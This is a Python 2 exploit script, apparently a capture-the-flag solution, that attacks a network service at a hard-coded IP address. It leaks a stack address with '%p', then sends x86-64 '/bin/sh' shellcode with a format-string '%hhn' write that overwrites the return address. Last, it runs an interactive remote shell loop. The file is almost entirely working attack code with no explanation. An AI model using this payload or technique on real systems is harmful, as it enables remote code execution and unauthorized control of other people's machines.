#!/usr/bin/python2


import socket
import time
import re
from struct import pack

recover = 0x7fff405f90a0 - 8 - 0x7fff405f69b0
reStr = '0x.{12}'
rex = re.compile(reStr)
shellcode = 'H1\xc0PH\xbb/bin//shSH\x89\xe7H1\xf6H1\xd2\xb0;\x0f\x05'
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('222.182.106.193', 33333))


time.sleep(2)
print s.recv(1024)

s.send('%p')
time.sleep(1)

target = s.recv(1024)
target = int(rex.findall(target)[0],16)
ret = target + recover

s.send(shellcode + 'a' * 0x2d + '%22$hhn' + 'a' * 14 + '%23$hhn' + 'a' * 19 + '%24$hhnc' + pack('<Q', ret+2) + pack('<Q', ret) + pack('<Q', ret+1))
time.sleep(1)
print s.recv(1024)
for i in range(1000):
	s.send(raw_input('@')+'\n')
	print s.recv(1024)

